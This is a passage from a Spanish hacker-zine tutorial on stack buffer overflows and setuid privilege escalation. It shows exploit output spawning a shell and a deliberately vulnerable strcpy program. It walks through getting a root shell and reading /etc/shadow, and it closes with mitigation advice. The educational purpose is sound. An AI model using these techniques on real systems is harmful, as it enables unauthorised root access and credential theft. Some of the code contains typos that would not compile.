+  execve(args[0], args, NULL);
+  
+  perror("execve()");
+}
+****************************************************
+	
+        # gcc exploit2.c -o exploit2
+        # ./exploit -400
+        Uso:
+        ./exploit [offset]
+
+        Explotando...
+        El valor de EBP salvado es : 90909090
+        La direccion de retorno es : bffff768
+        sh-2.03# 
+
+
+Coño, ya funciona! :) Si probais, vereis que ahora hay un monton de offsets
+validos.
+
+Bueno, pues esto es basicamente un buffer overflow. Hay un monton de
+variantes, porque no son siempre tan faciles de explotar, por ejemplo, a
+veces te tienes que currar una shell sin letras alfanumericas, o sin un
+caracter en concreto... Tambien un tipo de desbordamientos donde la zona de
+memoria que sobrescribes no esta en la pila, si no en la heap, y ahi no hay
+direccion de retorno, asi que hay que ingeniarselas de otra manera. Quiza
+para otro articulo :)
+
+
+ALGO SOBRE LOS PROCESOS EN UNIX
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Hemos visto como funciona un buffer overflow bastante sencillo, y que nos
+premetia cargar /bin/sh, ¿Pero como que usuario se ejecuta? ¿Que permisos
+tendre en el sistema? El usuario sera el mismo, y logicamente los premisos
+tambien. Cuando nosotros en UNIX cargamos un proceso a este se le asocia
+un PID (identificador del proceso), un UID (identificador de usuario
+real), un EUID (identificador de usuario efectivo), un GID (identificador
+de grupo real) y un EGID (identificador de usuario efectivo). El UID y el
+GUID del proceso es el mismo que son los mismo que los del usuario que
+ejecuta dicho proceso, y el EUID y EGID marcan los privilegios del
+proceso. Lo mas normal es que UID y EUID (al igual que GID y EGID)
+coincidan, pero no siempre es asi, hay situaciones en las que EUID y EGID
+toman como valor el UID y el GID que tiene el fichero. ¿Cuando ocurre
+esto? Cuando el fichero a ejecutar tiene el setsuid activado (chmod +s
+&lt;fichero>). Todo esto parece muy complicado pero realmente es muy simple,
+vamos a verlo con algunos ejemplos:
+
+---// m_ids.c /---
+
+#include &lt;stdio.h>
+#include &lt;sys/types.h>
+
+main() {
+  printf("Los valores UID, EUID, GID y EGID de este proceso son:\n");
+  printf("UID=%d\n", getuid());
+  printf("EUID=%d\n", geteuid());
+  printf("GID=%d\n", getgid());
+  printf("EGID=%d\n", getegid());
+}
+
+---// m_ids.c /---
+
+Miramos el usuario con el que estamos trabajando y compilamos...
+
+	# whoami
+    root
+    # gcc m_ids.c -o m_ids
+    # ./m_ids
+    Los valores UID, EUID, GID y EGID de este proceso son:
+	UID=0
+	EUID=0
+	GID=0
+	EGID=0
+    #
+
+Logicamente, UID, EUID, GID, EGID, valen 0, pues somo el administrador del
+sistema, el que tiene mayor control sobre el sistema, ¿pero que ocurriria
+si ejectasemos ese mismo proceso con otro usuario? Vamos a provar:
+
+Primero cambiamos los permisos para que cualquier usuario pueda ejecurtar
+dicho fichero. 
+
+	# chmod 711 m_ids
+
+Ahora cambiamos a otro usuario (UID, y GID del usuario distintos).
+
+	#su ripe
+    $ ./m_ids
+	Los valores UID, EUID, GID y EGID de este proceso son:
+    UID=500
+	EUID=500
+    GID=500
+    EGID=500
+    #
+
+Como podemos el poder que el proceso ejecutado tiene ha cambiado, pues
+pasa a tener el mismo poder que el usuario "ripe" tiene sobre el sistema
+¿facil no? Pues veamos que pasa si ativamos el setsuid en m_ids.
+
+Primero tenemos que volver a ser los propietarios del fichero para poder
+usar chmod con el fichero.
+
+	$ exit
+
+Setsuid ON :)
+
+	# chmod +s m_ids
+
+Nuevamente nos metamorfoseamos y ejecutamos el fichero.
+
+	# su ripe
+	$ ./m_ids
+    Los valores UID, EUID, GID y EGID de este proceso son:
+    UID=500
+    EUID=0
+    GID=500
+    EGID=0
+    #
+
+Vemos claramente que en este caso UID y EUID no coinciden (tampoco lo
+hacen GID y EGID), ello es por que al estar activo el setsuid EUID y EGID
+toman los valores UID i GID del fichero respectivamente, y debido a que
+m_ids pertenece al usuario "root" (UID=0) y al grupo "root" (GID=0),
+cualquier usuario que ejecute dicho fichero lo hara con privilegios de
+"root", esto quiere decir que cualquier llamada que ese proceso haga al
+sistema la hara como "root" (UID=0). 
+
+Espero que haya quedado claro el uso de setsuid (chmod +s
+&lt;fichero>), en caso de duda mandad un mail a 7a69ezine@mixmail.com o
+a ripe@mixmail.com.
+
+
+VOLVAMOS AL EJEMPLO ANTERIOR
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Volviendo al ejemplo que nos ha expuesto Doing, nosotros logramos que un
+fichero binario ejecute /bin/sh, pero como podeis ver, esto no tiene (en
+principio ninguna utilidad, pues no conseguimos en ningun momento mejorar
+nuestros privilegios en el sistema).
+
+	# su ripe
+	$ ./exploit2 1
+    Uso:
+    ./exploit2 [offset]
+
+	Explotando...
+	El valor de EBP salvado es : 90909090
+    La direccion de retorno es : 7ffff8d7
+    Bash$ cat /etc/shadow
+    cat: /etc/shadow: permiso denegado
+
+Pues vaya mierda... no consigo nada.
+
+Vamos a hacer un par de modificaciones al programilla "prueba2.c"
+
+---// prueba3.c //---
+
+#include &lt;stdio.h>
+
+int main(int argc, char *argv[]) {
+  unsigned log *ret;
+  char buf[1024]
+
+  if(argc > 1) strcpy(buf, argv[1]);
+
+  printf("El UID, el GID, el EUID y el EGID de este proceso son:\n");
+  printf(" UID=%d\n", getuid());
+  printf(" GID=%d\n", getgid());
+  printf(" EUID=%d\n", geteuid());
+  printf(" EGID=%d\n", getegid());
+  
+  ret=&ret;
+  ret += 1;
+  printf(" El valor de EBP salvado es: %04x\n", *ret);
+  rer += 1;
+  printf(" La direccion de retorno es: %0ax\n", *ret);
+  fflush(stdout);
+
+}
+
+---// prueba3.c //---
+
+Compilamos :->
+
+	$ gcc prueba3.c -o prueba3
+
+Ahora tendras que hacer tambien una pequeña modificacion al exploit.
+Debido a que ahora este tendra que explotar "prueba3" y no "prueba2",
+debes cambiar la linea args[0]="./prueba2", por la linea
+"args[0]="./prueba3". Ya estamos preparados para ver que pasa
+
+  	$ ./exploit2 1
+	Uso:
+   ./exploit2 [offset]
+
+	Explotando...
+    El UID, el GID, el  EUID, el EGID de este proceso son:
+    UID=500;
+    GID=500;
+    EUID=500;
+    EGID=500;
+
+    El valor de EBP salvado es : 90909090
+    La direccion de retorno es : 7ffff8ba
+    bash$
+
+Vemos "prueba3" se ha ejecutado con EUID=500 y EGID=500 (los mismo que
+tiene el usuario ripe), por lo que el bash que hemos logrado abrir tendra
+estos privilegios... malo malo, no hemo ganado nada (a estas alturas ya
+deberiais saber porque :P).
+
+¿Entonces "prueba3" no se puede explotar para lograr mas privilegios? Pues
+tal y como esta la situacion no, pues todos y que "prueba3" es vulnerable
+este se ejecuta con los mismos privilegios que "exploit2", que ha sido
+llamado por el usuario "ripe" (UID=500, GID=500). Sinembargo si "prueba3"
+tiene setsuid activado.... A ver que ocurre.
+
+	# whoami
+    root
+	# chmod +s prueba3
+    # su ripe
+    $ ./exploit2 69
+    Uso:
+    ./exploit2 [offset]
+
+	Explotando...
+	El UID, el GID, el EUID, y el EGID de este proceso son:
+    UID=500;
+	GID=500;
+	EUID=0;
+	EGID=0;
+	
+    El valor de EBP salvado es : 90909090
+    La direccion de retorno es : 7ffff893
+    bash# cat /etc/shadow
+    root:4rTGBh&hn&/Hlaa&mdeK23f12eQrUJha:11125:0:99999:::
+    bin:*:11125:0:99999:::
+    ...(etc, etc :P)
+
+Ahora vemos que el proceso se ejecuta con EUID=0 y EGID=0, por lo que la
+llamada a /bin/sh se hara como root, de manera que ¡tachaaa! se nos abre
+un bash con privilegios de root. No esta mal ¿Ahora que hago? Esto depende
+de ti.
+
+
+¿CON QUE APLICACIONES CHUTA TODO ESTO?
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Asi pues ¿que aplicaciones son vulnerables a este tipo de ataques? Pues,
+creo que esta claro, cualquier aplicacion con setsuid activado y a la que
+se le pueda desbordar el buffer. Si detectas una aplicacion vulnerable en
+tu sistema la solucion en bien sencilla, basta con desactivar el setsuid
+(chmod -s &lt;fichero>).
+
+```
+
+</div>
